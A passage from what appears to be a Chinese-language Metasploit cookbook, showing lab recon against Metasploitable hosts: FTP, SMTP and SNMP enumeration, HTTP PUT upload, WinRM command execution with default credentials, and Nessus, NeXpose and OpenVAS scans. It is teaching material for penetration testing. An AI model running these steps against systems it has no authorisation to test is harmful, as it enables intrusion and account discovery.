  msf auxiliary(ssh_login) > sessions -i 1\n[*] Starting interaction with 1...\n```\n\
  \n```\nhostname\nmetasploitable\nid\nuid=1001(user) gid=1001(user) groups=1001(user)\n\
  ```\n\n## FTP 扫描\n\n在本教程中，我们将使用 Metasploit 对网络中所有开放的 FTP 服务器进行版本扫描。\n\n## 准备工作\n\
  \nFTP Version Scanner 辅助模块允许我们检测正在运行的 FTP 版本。\n\n## 如何操作...\n\n1. 要扫描网络上的 FTP 服务器，请使用\
  \ `auxiliary/scanner/ftp/ftp_version` 辅助模块，设置 RHOSTS 中的目标地址范围，并将并发线程数设置为 256：\n\n\
  ```\nmsf > use auxiliary/scanner/ftp/ftp_version\nmsf auxiliary(ftp_version) > set\
  \ RHOSTS 192.168.216.10,129\nRHOSTS => 192.168.216.10,129\nmsf auxiliary(ftp_version)\
  \ > set THREADS 256\nTHREADS => 256\nmsf auxiliary(ftp_version) > run\n\n[+] 192.168.216.129:21\
  \ - FTP Banner: '220 (vsFTPd 2.3.4)\\x0d\\x0a'\n[*] Scanned 1 of 2 hosts (50% complete)\n\
  [*] Scanned 2 of 2 hosts (100% complete)\n[*] Auxiliary module execution completed\n\
  msf auxiliary(ftp_version) >\n```\n\n2. 扫描结果，如同之前的辅助模块，将存储在 Metasploit 数据库中，可以使用\
  \ `services` 命令访问：\n\n```\nmsf auxiliary(ftp_version) > services\n\nServices\n========\n\
  \nhost port proto name state info\n---- ---- ----- ---- ----- ----\n192.168.216.129\
  \ 21 tcp ftp open 220 (vsFTPd 2.3.4)\\x0d\\x0a\n\nmsf auxiliary(ftp_version) >\n\
  ```\n\n## SMTP 枚举\n\n简单邮件传输协议（SMTP）服务有两个内部命令允许用户枚举：VRFY（确认有效用户名的名称）和 EXPN（揭示用户别名的实际地址以及电子邮件列表（邮件列表））。\n\
  \n\n\n\n\n## 准备工作\n\nSMTP 用户枚举实用程序辅助模块，通过实现这些 SMTP 命令，可以揭示有效用户的列表。\n\n## 如何操作...\n\
  \nSMTP 用户枚举实用程序辅助模块，默认情况下，将使用位于 /usr/share/metasploit-framework/data/wordlists/\
  \ 的 unix_users.txt 文件，但你可以指定自己的文件。要运行该模块，设置目标地址范围、并发线程数，并输入 run：\n\n```\nmsf > use\
  \ auxiliary/scanner/smtp/smtp_enum\nmsf auxiliary(smtp_enum) > set RHOSTS 192.168.216.129\n\
  msf auxiliary(smtp_enum) > set THREADS 256\nTHREADS => 256\nmsf auxiliary(smtp_enum)\
  \ > run\n\n[*] 192.168.216.129:25 - 192.168.216.129:25 Banner: 220 metasploitable.localdomain\
  \ ESMTP Postfix (Ubuntu)\n[+] 192.168.216.129:25 - 192.168.216.129:25 Users found:\
  \ , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail,\
  \ man, news, nobody, postgres, postmaster, proxy, service, sshd, sync, sys, syslog,\
  \ user, uucp, www-data\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary\
  \ module execution completed\nmsf auxiliary(smtp_enum) >\n```\n\n输出揭示了 Metasploitable\
  \ 2 目标的有效用户列表。\n\n## SNMP 枚举\n\n简单网络管理协议（SNMP）用于在网络设备上远程读取、写入和更新设备配置。SNMP 扫描通常是查找特定系统的大量信息，甚至实际入侵远程设备的良好指标。在本教程中，我们将学习如何使用\
  \ SNMP 扫描模块。\n\n## 准备工作\n\nMetasploit 有一个内置的辅助模块专门用于扫描 SNMP 设备。在执行攻击之前，必须先了解它。首先，只读和读写社区字符串在可以从设备本身挖掘或更改的信息类型中起着重要作用。管理信息库（MIB）接口允许我们查询设备并提取信息。\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_425_0.png)\n\n如果处理的是配置了 SNMP 的基于 Windows\
  \ 的设备，通常使用 RO/RW 社区字符串，我们可以提取补丁级别、正在运行的服务、上次重启时间、系统上的用户名、路由以及各种其他具有黑客价值的方面。\n\n\
  在通过 SNMP 查询时，有 MIB API。此接口允许我们查询设备并提取信息。Metasploit 在其数据库中加载了一份默认 MIB 列表；它们用于根据是否获得访问权限的等级查询设备以获取更多信息。\n\
  \n## 如何操作...\n\n- 1. SNMP 社区登录扫描器辅助模块使用常见的社区名称登录 SNMP 设备：\n\n```\nmsf > use auxiliary/scanner/snmp/\n\
  msf > use auxiliary/scanner/snmp/snmp_login\nmsf auxiliary(snmp_login) > set RHOSTS\
  \ 192.168.216.10,129\nRHOSTS => 192.168.216.10,129\nmsf auxiliary(snmp_login) >\
  \ run\n\n[+] 192.168.216.10:161 - Login Successful: public (Access level: read-only);\
  \ Proof (sysDescr.0): Hardware: Intel64 Family 6 Model 70 Stepping 1 AT/AT COMPATIBLE\
  \ - Software: Windows Version 6.1 (Build 7601 Multiproc essor Free)\n[*] Scanned\
  \ 1 of 2 hosts (50% complete)\n[*] Scanned 2 of 2 hosts (100% complete)\n[*] Auxiliary\
  \ module execution completed\nmsf auxiliary(snmp_login) >\n```\n\n2. 我们可以使用 SNMP\
  \ 扫描模块收集大量信息，例如开放端口、服务、主机名、进程和运行时间。为了实现这一点，我们将运行 auxiliary/scanner/snmp/snmp_enum\
  \ 辅助模块，看看它能为我们提供什么信息：\n\n```\nmsf > use auxiliary/scanner/snmp/snmp_enum\nmsf auxiliary(snmp_enum)\
  \ > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(snmp_enum)\
  \ > run\n\n[+] 192.168.216.10, Connected.\n\n[*] System information:\n...\n\nContact\
  \ : -\nLocation : -\nUptime snmp : 14:52:25.92\nUptime system : 00:01:55.31\nSystem\
  \ date : 2017-10-21 03:36:31.2\n\n[*] User accounts:\n...\n\n[\"Administrator\"\
  ]\n[\"luke_skywalker\"]\n[\"anakin_skywalker\"]\n[\"lando_calrissian\"]\n...\n```\n\
  \n## HTTP 扫描\n\n超文本传输协议（HTTP）是一种应用协议，作为万维网数据通信的基础。由于它被众多应用使用，从物联网（IoT）设备到移动应用程序，它是搜索漏洞的绝佳场所。\n\
  \n## 准备工作\n\nHTTP SSL 证书检查器辅助模块将检查指定 Web 服务器的证书，以确保主题和颁发者与提供的模式匹配，并且证书未过期。\n\nHTTP\
  \ Robots.txt 内容扫描器辅助模块将搜索 `robots.txt` 文件并分析其内容。\n\n如果 `PUT` 方法可以被任何未经身份验证的远程用户使用，任意网页可以插入到\
  \ Web 根目录中，可能导致网站被篡改甚至远程代码执行，或者磁盘可以用无意义的数据填满，导致拒绝服务攻击。\n\nJenkins-CI 枚举 HTTP 辅助模块在无需身份验证的情况下枚举远程\
  \ Jenkins-CI 安装，包括主机操作系统和 Jenkins 安装详细信息。\n\n## 如何操作...\n\n- 1. 要运行 HTTP SSL 证书检查器辅助模块，我们需要指定目标主机和目标端口：在此示例中为\
  \ `192.168.216.10` 和端口 `8383`：\n\n```\nmsf > use auxiliary/scanner/http/cert\nmsf\
  \ auxiliary(cert) > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(cert)\
  \ > set RPORT 8383\nRPORT => 8383\nmsf auxiliary(cert) > run\n\n[*] 192.168.216.10:8383\
  \ - 192.168.216.10 - 'Desktop Central' :\n/C=US/ST=CA/L=Pleasanton/O=Zoho\nCorporation/OU=ManageEngine/CN=Desktop\n\
  Central/emailAddress=support@desktopcentral.com\n[*] 192.168.216.10:8383 - 192.168.216.10\
  \ - 'Desktop Central' :\n'2010-09-08 12:24:44 UTC' - '2020-09-05 12:24:44 UTC'\n\
  [*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\
  msf auxiliary(cert) >\n```\n\n- 2. 要运行 HTTP Robots.txt 内容扫描器辅助模块，我们将指定查找 `robots.txt`\
  \ 文件的测试路径和目标 IP 地址：\n\n```\nmsf > use auxiliary/scanner/http/robots_txt\nmsf auxiliary(robots_txt)\
  \ > set PATH /mutillidae\nPATH => /mutillidae\nmsf auxiliary(robots_txt) > set RHOSTS\
  \ 192.168.216.129\nRHOSTS => 192.168.216.129\nmsf auxiliary(robots_txt) > run\n\
  ```\n\n```\nDisallow: ./owasp-esapi-php/\nDisallow: ./documentation/\n[*] Scanned\
  \ 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(robots_txt)\
  \ >\n```\n\n3. HTTP 可写路径 PUT/DELETE 文件访问辅助模块可以利用配置不当的 Web 服务器通过 PUT 和 DELETE HTTP\
  \ 请求上传和删除 Web 内容。设置操作为 PUT 或 DELETE。PUT 为默认值。如果未指定文件名，模块将为你生成一个随机的 .txt 文件：\n\n\
  ```\nmsf > use auxiliary/scanner/http/http_put\nmsf auxiliary(http_put) > set PATH\
  \ /uploads\nPATH => /uploads\nmsf auxiliary(http_put) > set RHOSTS 192.168.216.10\n\
  RHOSTS => 192.168.216.10\nmsf auxiliary(http_put) > set RPORT 8585\nRPORT => 8585\n\
  msf auxiliary(http_put) > run\n\n[+] File uploaded:\nhttp://192.168.216.10:8585/uploads/msf_http_put_test.txt\n\
  [*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\
  msf auxiliary(http_put) >\n```\n\n4. 要运行辅助模块，我们需要指定目标地址或范围、目标端口以及 Jenkins-CI 应用的路径：\n\
  \n```\nmsf > use auxiliary/scanner/http/jenkins_enum\nmsf auxiliary(jenkins_enum)\
  \ > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(jenkins_enum)\
  \ > set RPORT 8484\nRPORT => 8484\nmsf auxiliary(jenkins_enum) > set TARGETURI /\n\
  TARGETURI => /\nmsf auxiliary(jenkins_enum) > run\n```\n\n```\n[+] http://192.168.216.10:8484/\
  \ - /systemInfo does not require authentication (200)\n[*] Scanned 1 of 1 hosts\
  \ (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(jenkins_enum)\
  \ >\n```\n\n查看输出，我们能够枚举 Jenkins 版本、主机操作系统和安装详细信息。\n\n## WinRM 扫描和暴力破解\n\nWindows\
  \ 远程管理（WinRM）是 Microsoft 对 WS-Management 协议的实现，这是一种基于标准简单对象访问协议（SOAP）的、防火墙友好的协议，允许来自不同厂商的硬件和操作系统相互操作。\n\
  \n## 准备工作\n\nWinRM 身份验证方法检测辅助模块向 HTTP/HTTPS 服务发送请求，以查看它是否为 WinRM 服务。如果是 WinRM 服务，它还会收集支持的身份验证方法。\n\
  \n现在我们知道目标系统已启用 WinRM，我们可以开始扫描，看看是否可以利用 WinRM 并入侵系统。\n\n使用 SMB 登录检查扫描器辅助模块找到的凭据，我们可以测试是否可以使用\
  \ WinRM 服务运行 Windows 命令，使用 WinRM 命令运行器辅助模块。\n\n## 如何操作...\n\n- 1. 要使用 WinRM 身份验证方法检测辅助模块，设置\
  \ RHOSTS 中的目标地址范围并输入 run：\n\n```\nmsf > use auxiliary/scanner/winrm/winrm_auth_methods\n\
  msf auxiliary(winrm_auth_methods) > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\n\
  msf auxiliary(winrm_auth_methods) > run\n\n[+] 192.168.216.10:5985: Negotiate protocol\
  \ supported\n[+] 192.168.216.10:5985: Basic protocol supported\n[*] Scanned 1 of\
  \ 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(winrm_auth_methods)\
  \ >\n```\n\n\n2. 要运行 WinRM Command Runner 辅助模块，我们需要设置目标 IP 地址、要运行的 Windows 命令、用户名\
  \ Administrator 以及密码 vagrant：\n\n```\nmsf > use auxiliary/scanner/winrm/winrm_cmd\n\
  msf auxiliary(winrm_cmd) > set CMD hostname\nCMD => hostname\nmsf auxiliary(winrm_cmd)\
  \ > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(winrm_cmd)\
  \ > set USERNAME Administrator\nUSERNAME => Administrator\nmsf auxiliary(winrm_cmd)\
  \ > set PASSWORD vagrant\nPASSWORD => vagrant\nmsf auxiliary(winrm_cmd) > run\n\n\
  [+] vagrant-2008R2\n\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module\
  \ execution completed\nmsf auxiliary(winrm_cmd) >\n```\n\n查看该模块的输出，我们可以看到可以在目标机器上运行远程命令。\n\
  \n## 与 Nessus 集成\n\n到目前为止，我们已经学习了端口扫描的基础知识，以及使用 Nmap 的实际实现。端口扫描已扩展到多种其他工具，进一步增强了扫描和信息收集的过程。在接下来的几个示例中，我们将介绍那些扫描目标以查找可用服务和开放端口，然后尝试确定该特定服务或端口可能存在何种类型漏洞的工具。让我们开始漏洞扫描之旅。\n\
  \nNessus 是最广泛使用的漏洞扫描器之一。它扫描目标的各种漏洞并生成详细报告。Nessus 是渗透测试中非常有用的工具。您可以使用 Nessus 的 GUI\
  \ 版本，也可以在 Metasploit 控制台中使用它。在本书中，我们将主要关注使用 Nessus 与 msfconsole。\n\n## 准备工作\n\n\
  首次使用 Nessus 时，您需要注册并从 Nessus 网站获取注册码。要测试 Nessus，您可以使用 **Nessus家庭版**，它允许您扫描个人家庭网络（每个扫描器最多\
  \ 16 个 IP 地址）。您可以在 https://www.tenable.com/products/nessus-home 下载它。\n\n要在 Kali\
  \ Linux 上安装 Nessus，在下载页面为您的 32 或 64 位版本选择 Debian 软件包文件（.deb），并使用 `dpkg -i` 命令，后跟\
  \ Nessus 软件包文件：\n\n```\nroot@kali:~# dpkg -i Nessus*.deb\n...\nUnpacking Nessus\
  \ Core Components...\nessusd (Nessus) 6.11.1 [build M20101] for Linux\nCopyright\
  \ (C) 1998 - 2017 Tenable Network Security, Inc\n\nProcessing the Nessus plugins...\n\
  [########################################]\n\nAll plugins loaded (1sec)\n\n- You\
  \ can start Nessus by typing /etc/init.d/nessusd start\n- Then go to https://kali:8834/\
  \ to configure your scanner\n\nProcessing triggers for systemd (235-2) ...\nroot@kali:~#\n\
  ```\n\n然后，使用以下命令启动 Nessus 服务：\n\n```\nroot@kali:~# systemctl start nessusd.service\n\
  ```\n\n然后打开浏览器并访问 https://kali:8834/ 来配置 Nessus。要在 `msfconsole` 中开始使用 Nessus，我们需要加载\
  \ Nessus，然后将其与服务器连接以开始渗透测试。\n\n## 如何操作...\n\n- 1. 首先，我们将启动 msfconsole 并加载 nessus\
  \ 插件：\n\n```\nmsf > load nessus\n[*] Nessus Bridge for Metasploit\n[*] Type nessus_help\
  \ for a command listing\n[*] Successfully loaded plugin: Nessus\nmsf >\n```\n\n\
  - 2. 通过运行 nessus_help 命令，我们可以显示所有可用命令：\n\n```\nmsf > nessus_help\n\nCommand    \
  \      Help Text\n--------         --------\nGeneric          Commands\n----------------\
  \  ----------------\nnessus_connect     Connect to a Nessus server\nnessus_logout\
  \     Logout from the Nessus server\nnessus_login      Login into the connected\
  \ Nessus server with a different username and password\nnessus_save       Save credentials\
  \ of the logged in user ...\n\nScan             Commands\n----             --------\n\
  nessus_scan_list   List of all current Nessus scans\nnessus_scan_new   Create a\
  \ new Nessus Scan\nnessus_scan_launch Launch a newly created scan. New scans need\
  \ to be manually launched through this command\nnessus_scan_pause Pause a running\
  \ Nessus scan\nnessus_scan_pause_all Pause all running Nessus scans\n\n...     \
  \          \nPolicy           Commands\n------           --------\nnessus_policy_list\
  \ List all policies\nnessus_policy_del Delete a policy\n\nmsf >\n```\n\n3. 要连接到\
  \ Nessus，请使用 nessus_connect 命令，并提供 Nessus 凭据、主机名、端口（如果未使用默认端口 8834），并验证 SSL 证书：\n\
  \n```\nmsf > nessus_connect NessusUser:NessusP4ssw0rd@127.0.0.1 ok\n[*] Connecting\
  \ to https://127.0.0.1:8834/ as NessusUser\n[*] User NessusUser authenticated successfully.\n\
  msf >\n```\n\n4. 使用 nessus_policy_list 命令，我们可以列出服务器上的所有策略；在通过 msfconsole 使用 Nessus\
  \ 之前，您需要连接到 Nessus GUI 并创建策略后才能使用它：\n\n```\nmsf > nessus_policy_list\nPolicy ID\
  \   Name            Policy UUID\n---------   ----            -----------\n4    \
  \       Basic Network Scan 731a8e52-3ea6-a291-ec0a-d2ff0619c19d7bd788d6be818b65\n\
  \nmsf >\n```\n\n5. 要创建新的 Nessus 扫描，我们使用 nessus_scan_new 命令，后跟要使用的策略的 UUID、扫描名称、描述和目标：\n\
  \n```\nmsf > nessus_scan_new 731a8e52-3ea6-a291-ec0a-d2ff0619c19d7bd788d6be818b65\
  \ Metasploitable3 \"Windows Machine\" 192.168.216.10\n[*] Creating scan from policy\
  \ number 731a8e52-3ea6-a291-ec0a-d2ff0619c19d7bd788d6be818b65, called Metasploitable3\
  \ - Windows Machine and scanning 192.168.216.10\n[*] New scan added\n[*] Use nessus_scan_launch\
  \ 6 to launch the scan\nScan ID   Scanner ID   Policy ID   Targets          Owner\n\
  -------   ----------   ---------   -------          ------\n9         1        \
  \    8           192.168.216.10   NessusUser\n\nmsf >\n```\n\n6. `nessus_scan_list`\
  \ 命令返回有关当前扫描的信息列表：\n\n```\nmsf > nessus_scan_list\nScan ID   Name            Owner\
  \       Started     Status      Folder\n-------   ----            -----       --------\
  \    ------      ------\n9         Metasploitable3 NessusUser              empty\
  \       3\n\nmsf >\n```\n\n7. 从输出中，我们可以看到扫描已创建，但尚未启动。要启动扫描，我们使用 `nessus_scan_launch`\
  \ 后跟扫描 ID：\n\n```\nmsf > nessus_scan_launch 9\n[+] Scan ID 9 successfully launched.\
  \ The Scan UUID is f6309e8e-8ff4-2744-a9f3-40fa6b0d737793e6668aadb812c9\n\nmsf >\n\
  ```\n\n8. 通过再次运行 `nessus_scan_list` 命令，我们可以看到扫描正在运行：\n\n```\nmsf > nessus_scan_list\n\
  Scan ID   Name            Owner       Started     Status      Folder\n-------  \
  \ ----            -----       --------    ------      ------\n9         Metasploitable3\
  \ NessusUser              running     3\n\nmsf >\n```\n\n9. nessus_scan_details\
  \ 允许我们获取有关扫描的信息，例如信息、主机、漏洞和历史记录，如以下屏幕截图所示：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_435_0.png)\n\
  \n10. 要检查扫描是否已完成，请使用 nessus_scan_details 命令：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_435_1.png)\n\
  \n11. 扫描完成后，我们可以使用 `nessus_db_import` 命令将扫描结果导入 Metasploit：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_436_0.png)\n\
  \n12. 现在我们已将所有数据导入 Metasploit，我们可以使用 `msfconsole` 数据库命令查找服务和漏洞并尝试利用它们：\n\n```\n\
  msf > hosts\n\nHosts\n=====\n\naddress mac name os_name os_flavor os_sp purpose\
  \ info comments\n------- --- ---- -------- ---------- ----- -------- ---- --------\n\
  192.168.216.10 08:00:27:2f:fe:84 192.168.216.10 Windows 2008 SP1 server\n\nmsf >\
  \ services\n\nServices\n========\n\nhost            port  proto  name        state\
  \  info\n----            ----  -----  ----        -----  ----\n192.168.216.10  22\
  \    tcp    ssh         open\n192.168.216.10  135   tcp    epmap       open\n192.168.216.10\
  \  137   udp    netbios-ns  open\n192.168.216.10  139   tcp    smb         open\n\
  ...\n\n[*] Time: 2017-10-23 09:12:50 UTC Vuln: host=192.168.216.10 name=Service\
  \ Detection refs=NSS-22964\n```\n\n[*] 时间: 2017-10-23 09:12:50 UTC 漏洞: host=192.168.216.10\
  \ name=Nessus SYN scanner refs=NSS-11219\n\n## 与 NeXpose 集成\n\n在之前的配方中，我们讨论了 Nessus\
  \ 作为潜在的漏洞扫描器。在本配方中，我们将介绍另一个重要的漏洞扫描器 NeXpose。\n\nNeXpose 是 Rapid7 的一款流行工具，用于执行漏洞扫描并将结果导入\
  \ Metasploit 数据库。NeXpose 的使用与 Nessus 类似，但让我们快速了解一下如何开始使用 NeXpose。我将把更深入探索的任务留作你的作业。\n\
  \n### 准备工作\n\n你可以从 http://www.rapid7.com/products/metasploit/metasploit-community-registration.jsp\
  \ 下载 NeXpose Community。安装 NeXpose 后，你可以从 msfconsole 开始使用它，但首先，我们需要加载插件以连接到 NeXpose\
  \ 服务器。让我们在命令行中执行以下步骤：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_437_0.png)\n\n\
  要连接到 NeXpose 服务器，请使用 nexpose_connect 命令，后跟凭据、主机名、端口，并验证 SSL 证书：\n\n```\nmsf > nexpose_connect\
  \ NexposeUser:NexposeP4ssw0rd@127.0.0.1:3780 ok\n[*] Connecting to Nexpose instance\
  \ at 127.0.0.1:3780 with username NexposeUser...\nmsf >\n```\n\n### 如何操作...\n\n\
  现在我们已连接到服务器，可以扫描目标并生成报告。NeXpose 支持两种扫描命令。一种是 nexpose_scan，另一种是 nexpose_discover。前者将扫描一系列\
  \ IP 地址并导入结果，而后者仅扫描以发现其上运行的主机和服务。\n\n- 1. 让我们使用 NeXpose 对目标执行快速扫描：\n\n```\nmsf >\
  \ nexpose_discover 192.168.216.10\n[*] Scanning 1 addresses with template aggressive-discovery\
  \ in sets of 32\n[*] Completed the scan of 1 addresses\nmsf >\n```\n\nnexpose_discover\
  \ 命令启动扫描，但仅执行主机和最小服务发现。\n\n- 2. 要显示 nexpose_scan 命令的帮助，我们可以使用 -h 选项：\n\n```\nmsf\
  \ > nexpose_scan -h\nUsage: nexpose_scan [options] <Target IP Ranges>\n\nOPTIONS:\n\
  \n    -E <opt> Exclude hosts in the specified range from the scan\n    -I <opt>\
  \ Only scan systems with an address within the specified range\n    -P Leave the\
  \ scan data on the server when it completes (this counts against the maximum licensed\
  \ IPs)\n    -c <opt> Specify credentials to use against these targets (format is\
  \ type:user:pass)\n    -d Scan hosts based on the contents of the existing database\n\
  \    -h This help menu\n    -n <opt> The maximum number of IPs to scan at a time\
  \ (default is 32)\n    ...\n\nmsf >\n```\n\n- 3. 要扫描我们的目标，我们将使用 `nexpose_scan` 命令，`full-audit`\
  \ 扫描模板：\n\n```\nmsf > nexpose_scan -t full-audit 192.168.216.10\n[*] Scanning 1\
  \ addresses with template full-audit in sets of 32\n[*] Completed the scan of 1\
  \ addresses\nmsf >\n```\n\n- 4. 要导入扫描结果，我们将使用 `nexpose_site_import` 命令：\n\n```\n\
  msf > nexpose_site_import 1\n[*] Generating the export data file...\n[*] Downloading\
  \ the export data...\n[*] Importing Nexpose data...\nmsf >\n```\n\n将扫描结果导入 Metasploit\
  \ 后，我们可以使用 `msfconsole` 数据库命令显示找到的主机、服务和漏洞。\n\n## 与 OpenVAS 集成\n\n**开放式漏洞评估系统 (OpenVAS)**\
  \ 是最广泛使用的开源漏洞扫描和漏洞管理解决方案。\n\nOpenVAS 是作为 Greenbone 安全解决方案的一部分使用和支持的扫描引擎。自 2005 年以来，Greenbone\
  \ 开发团队为 OpenVAS 的增强做出了重大贡献。\n\n### 如何操作...\n\n- 1. 要在 Kali Linux 上安装 OpenVAS，请使用\
  \ `apt install openvas` 命令：\n\n```\nroot@kali:~# apt-get install openvas\n```\n\n\
  - 2. 然后使用 `openvas-setup` 命令设置 OpenVAS，下载最新的规则，创建管理员用户并启动各种服务：\n\n```\nroot@kali:~#\
  \ openvas-setup\n```\n\n- 3. 设置完成后，OpenVAS 管理器、扫描器和 GSAD 服务应正在监听。要启动 OpenVAS，请使用\
  \ openvas-start 命令：\n\n```\nroot@kali:~# openvas-start\nStarting OpenVas Services\n\
  root@kali:~#\n```\n\n- 4. 在 msfconsole 中使用 OpenVAS 之前，我们需要使用 load 命令加载 OpenVAS 插件：\n\
  \n```\nmsf > load openvas\n[*] Welcome to OpenVAS integration by kost and averagesecurityguy.\n\
  [*]\n[*] OpenVAS integration requires a database connection. Once the\n[*] database\
  \ is ready, connect to the OpenVAS server using openvas_connect.\n[*] For additional\
  \ commands use openvas_help.\n[*]\n[*] Successfully loaded plugin: OpenVAS\nmsf\
  \ >\n```\n\n- 5. 我们可以使用 help 命令显示 msfconsole 内部可用的所有 OpenVAS 命令：\n\n```\nmsf > help\
  \ openvas\n```\n\nOpenVAS 命令\n===============\n\n| 命令 | 描述 |\n|---|---|\n| openvas_config_list\
  \ | 快速显示配置列表 |\n| openvas_connect | 使用 OMP 连接到 OpenVAS 管理器 |\n| openvas_task_start\
  \ | 按 ID 启动任务 |\n| openvas_task_stop | 按 ID 停止任务 |\n| openvas_version | 显示 OpenVAS\
  \ 服务器的版本 |\n\n```\nmsf >\n```\n\n- 6. 要使用 OMP 连接到 OpenVAS 管理器，我们使用 openvas_connect，后跟\
  \ OpenVAS 用户名、密码以及 OpenVAS 服务器 IP 地址和端口：\n\n```\nmsf > openvas_connect admin 596230dc-cfe0-4322-a7b7-025d11a28141\
  \ 127.0.0.1 9390\n[*] Connecting to OpenVAS instance at 127.0.0.1:9390 with username\
  \ admin...\n/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/openvas-omp-0.0.4/lib/openvas-omp.rb:201:in\
  \ `sendreceive': Object#timeout is deprecated, use Timeout.timeout instead.\n[+]\
  \ OpenVAS connection successful\nmsf >\n```\n\n- 7. 连接到 OpenVAS 服务器后，我们需要使用 openvas_target_create\
  \ 命令指定我们的目标，后跟我们想要赋予目标的名称、目标的 IP 地址以及有关目标的描述或注释：\n\n```\nmsf > openvas_target_create\
  \ \"Metasploitable3\" 192.168.216.10 \"Windows Target\"\n[+] OpenVAS list of targets\n\
  ```\n\n| ID | 名称 | 主机 | 最大主机数 | 使用中 | 注释 |\n|---|---|---|---|---|---|\n| 83d3d851-150a-4d1b-80e3-04bb90d034cb\
  \ | Metasploitable3 | 192.168.216.10 | 1 | 0 | Windows Target |\n\n```\nmsf >\n\
  ```\n\n- 8. openvas_config_list 显示可用于扫描目标的配置列表：\n\n```\nmsf > openvas_config_list\n\
  [+] OpenVAS list of configs\n```\n\n| ID | 名称 |\n|---|---|\n| 085569ce-73ed-11df-83c3-002264764cea\
  \ | empty |\n| 2d3f051c-55ba-11e3-bf43-406186ea4fc5 | Host Discovery |\n| 698f691e-7489-11df-9d8c-002264764cea\
  \ | Full and fast ultimate |\n| 708f25c4-7489-11df-8094-002264764cea | Full and\
  \ very deep |\n| ... | ... |\n\n```\nmsf >\n```\n\n- 9. 现在，我们需要使用 openvas_task_create\
  \ 创建一个任务，后跟任务名称、注释、配置 ID 和目标 ID：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_442_0.png)\n\
  \n- 10. 要启动任务，我们将使用 openvas_task_start 后跟任务 ID：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_442_1.png)\n\
  \n- 11. 要监控进度，我们使用 openvas_task_list 命令：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_442_2.png)\n\
  \n- 12. openvas_format_list 将显示 OpenVAS 支持的报告格式列表：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_443_0.png)\n\
  \n- 13. 要查看任务是否已完成，请使用 openvas_task_list 命令：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_443_1.png)\n\
  \n- 14. 扫描完成后，我们可以使用 openvas_report_list 命令列出可用的报告：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_444_0.png)\n\
  \n- 15. 并使用 openvas_report_import 命令将报告导入 Metasploit。仅支持导入 NBE（旧版 OpenVAS 报告）和 XML\
  \ 格式：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_444_1.png)\n\n- 16. 将报告导入 Metasploit\
  \ 后，我们可以使用 msfconsole 数据库 vulns 命令列出找到的漏洞：\n"
- "## 12 服务器端利用\n\n本章将介绍以下配方：\n\n- 利用 Linux 服务器\n- SQL 注入\n- Shell 类型\n- 利用 Windows\
  \ Server 机器\n- 利用常见服务\n- MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n\
  - MS17-010 EternalRomance/EternalSynergy/EternalChampion\n- 安装后门\n- 拒绝服务\n\n###\
  \ 简介\n\n在第 12 章《信息收集和扫描》中，我们专注于收集有关目标的信息，例如目标 IP 地址、开放端口、可用服务、操作系统等。信息收集过程中最大的资产之一是了解目标服务器或系统使用的操作系统。这些信息在渗透目标机器时可能非常有帮助，因为我们可以快速查找系统上运行的服务的漏洞和利用。虽然过程并不像听起来那么简单，但了解目标操作系统及其运行的服务可以在很大程度上简化我们的任务。\n\
  \n\n\n每个操作系统版本都存在一些漏洞。一旦被报告，针对它的漏洞利用开发流程就开始了。像 Windows 这样的商业操作系统会迅速为漏洞或缺陷开发补丁，并以更新的形式提供给用户。漏洞披露如今是一个大问题。许多零日漏洞披露在计算机行业造成了混乱。零日漏洞备受追捧，市场价格可能在\
  \ 15,000 美元到 1,000,000 美元之间。漏洞会被检测和利用，但漏洞披露取决于研究人员及其意图。\n\n诸如 Microsoft、Apple 和\
  \ Google 等知名公司会定期为其产品发布补丁，但应用补丁取决于用户。在企业环境中情况更糟，由于涉及停机时间且为确保业务连续性不受影响，服务器的修补往往需要数周时间。因此，强烈建议您更新系统或关注在使用中的操作系统中发现的任何最新漏洞。未修补的系统是黑客的安全港，因为他们会立即启动漏洞利用来入侵目标。因此，定期修补和更新操作系统至关重要。本章将重点关注在一些最流行的服务和操作系统中报告的漏洞。\n\
  \n在渗透测试过程中，一旦获得目标操作系统的信息，渗透测试人员就会开始寻找针对特定服务或操作系统缺陷的可用漏洞利用。因此，本章将是通过服务器端漏洞渗透目标的第一步。我们将重点关注微软的一些最广泛使用的操作系统，以及\
  \ Linux 的一些发行版。我们还将了解如何使用漏洞利用并设置其参数，使其在目标机器上可执行。最后但同样重要的是，我们将讨论 Metasploit Framework\
  \ 中可用的一些有用有效载荷。让我们继续了解各种示例。\n\n在目标机器上使用漏洞利用和有效载荷之前，我们首先需要了解它们的一些基本知识。理解漏洞利用的使用方法至关重要，这样您才能克服因参数配置错误而可能出现的一些常见错误。因此，让我们从使用漏洞利用的基础知识以及如何设置参数值开始。\n\
  \n为了在目标上开始使用漏洞利用，首先需要扫描目标的开放端口和服务。一旦您收集了足够的目标信息，下一步就是相应地选择漏洞利用。因此，让我们分析一些可以直接从 MSFconsole\
